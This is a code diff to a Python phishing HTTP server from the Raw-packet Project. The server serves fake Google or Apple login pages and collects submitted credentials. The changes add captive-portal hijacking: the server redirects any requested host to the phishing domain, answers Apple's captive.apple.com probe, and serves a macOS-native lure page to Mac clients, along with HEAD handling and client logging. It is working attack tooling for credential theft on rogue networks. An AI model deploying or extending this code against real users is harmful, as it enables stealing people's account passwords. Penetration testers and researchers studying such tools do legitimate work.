@@ -10,7 +10,7 @@ Copyright 2020, Raw-packet Project
 # region Import
 from raw_packet.Utils.base import Base
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from typing import List, Dict, Tuple, Callable
+from typing import List, Dict, Tuple, Callable, Union
 from json import loads, decoder
 from user_agents import parse as user_agent_parse
 from os.path import abspath, dirname, isdir, isfile, join
@@ -40,13 +40,14 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
     def error_SendResponse(self, error_code: int):
         self.send_response(error_code)
         self.send_header('Content-Type', 'text/html')
+        self.send_header('Connection', 'close')
         self.end_headers()
         full_path: str = join(self.server.site_path + self.server.separator + 'errors' +
                               self.server.separator + str(error_code) + '.html')
         if isfile(full_path):
             self.wfile.write(open(full_path, 'rb').read())
         else:
-            self.wfile.write(bytes(string='<html>ERROR</html>', encoding='utf-8'))
+            self.wfile.write(bytes('<html>ERROR</html>', encoding='utf-8'))
 
     def error_BadRequest(self):
         self.error_SendResponse(error_code=400)
@@ -59,8 +60,21 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def error_CheckCreds(self):
         self.send_response(200)
+        self.send_header('Connection', 'close')
         self.end_headers()
         self.wfile.write(bytes('ERROR', 'utf-8'))
+
+    def redirect(self, status_code: int = 302):
+        self.send_response(status_code)
+        self.send_header('Location', 'http://' + self.server.site_domain + '/')
+        self.send_header('Connection', 'close')
+        self.end_headers()
+        self.wfile.write(bytes('<HTML><HEAD><TITLE> Web Authentication Redirect</TITLE>'
+                               '<META http-equiv="Cache-control" content="no-cache">'
+                               '<META http-equiv="Pragma" content="no-cache">'
+                               '<META http-equiv="Expires" content="-1">'
+                               '<META http-equiv="refresh" content="1; URL=http://' + self.server.site_domain +
+                               '/"></HEAD></HTML>', 'utf-8'))
     # endregion
 
     # region GET request
@@ -68,13 +82,20 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
 
         if 'User-Agent' not in self.headers:
             self.error_BadRequest()
-        else:
-            user_agent: str = self.headers['User-Agent']
 
-        device = user_agent_parse(user_agent)
-        os = device.os.family
+        if 'Host' not in self.headers:
+            self.error_BadRequest()
 
-        if self.server.site_path.endswith(self.server.separator + 'apple') and os == 'MacOS':
+        if self.server.site_domain is not None:
+            if self.headers['Host'] == 'captive.apple.com':
+                self.redirect(status_code=200)
+                return
+            if self.headers['Host'] != self.server.site_domain:
+                self.redirect()
+                return
+
+        if self.server.site_path.endswith(self.server.separator + 'apple') and \
+                ('Mac OS' in self.headers['User-Agent'] or 'CaptiveNetworkSupport' in self.headers['User-Agent']):
             self.server.site_path += self.server.separator + 'macos_native'
 
         if self.server.separator == '\\':
@@ -122,6 +143,7 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
         if isfile(full_path):
             self.send_response(200)
             self.send_header('Content-Type', content_type)
+            self.send_header('Connection', 'close')
             self.end_headers()
             self.wfile.write(open(full_path, 'rb').read())
         else:
@@ -166,17 +188,27 @@ class _PhishingHTTPRequestHandler(BaseHTTPRequestHandler):
             self.error_CheckCreds()
     # endregion
 
+    # region HEAD request
+    def do_HEAD(self):
+        if self.server.site_domain is not None:
+            if self.headers['Host'] != self.server.site_domain:
+                self.redirect()
+                return
+        self.error_BadRequest()
+    # endregion
+
     # region Log messages
     def log_message(self, format, *args):
         if not self.server.quiet:
-            if 'User-Agent' in self.headers:
-                device = user_agent_parse(self.headers['User-Agent'])
-                self.server.base.print_info('Phishing client address: ', self.address_string(),
-                                            ' os: ', device.os.family, ' browser: ', device.browser.family,
-                                            ' request: ', '%s' % format % args)
-            else:
-                self.server.base.print_info('Phishing client address: ', self.address_string(),
-                                            'request: ', '%s' % format % args)
+            user_agent = self.headers['User-Agent']
+            host = self.headers['Host']
+            if user_agent is None:
+                user_agent = 'None'
+            if host is None:
+                host = 'None'
+            self.server.base.print_info('Phishing client address: ', self.address_string(),
+                                        ' user-agent: ', user_agent, ' host: ', host,
+                                        ' request: ', '%s' % format % args)
     # endregion
 
 # endregion
@@ -187,11 +219,13 @@ class _PhishingHTTPServer(HTTPServer):
     def __init__(self,
                  server_address: Tuple[str, int],
                  RequestHandlerClass: Callable[..., BaseHTTPRequestHandler],
-                 site_path: str,
                  base_instance: Base,
+                 site_path: str,
+                 site_domain: Union[None, str] = None,
                  quiet: bool = False):
         super().__init__(server_address, RequestHandlerClass)
         self.site_path: str = site_path
+        self.site_domain: Union[None, str] = site_domain
         self.base: Base = base_instance
         self.quiet: bool = quiet
         if self.base.get_platform().startswith('Windows'):
@@ -216,12 +250,14 @@ class PhishingServer:
               address: str = '0.0.0.0',
               port: int = 80,
               site: str = 'google',
+              redirect: Union[None, str] = None,
               quiet: bool = False):
         """
         Start Phishing HTTP server
         :param address: IPv4 address for listening (default: '0.0.0.0')
         :param port: TCP port for listening (default: 80)
-        :param site: Set full path to site or site template 'apple' or 'google'
+        :param site: Set full path to site or phishing site template 'apple' or 'google'
+        :param redirect: Set phishing site domain for redirect (example: )
         :param quiet: Quiet mode
         :return: None
         """
@@ -250,6 +286,7 @@ class PhishingServer:
             httpd = _PhishingHTTPServer(server_address=(address, port),
                                         RequestHandlerClass=_PhishingHTTPRequestHandler,
                                         site_path=site_path,
+                                        site_domain=redirect,
                                         base_instance=self._base,
                                         quiet=quiet)
             httpd.serve_forever()
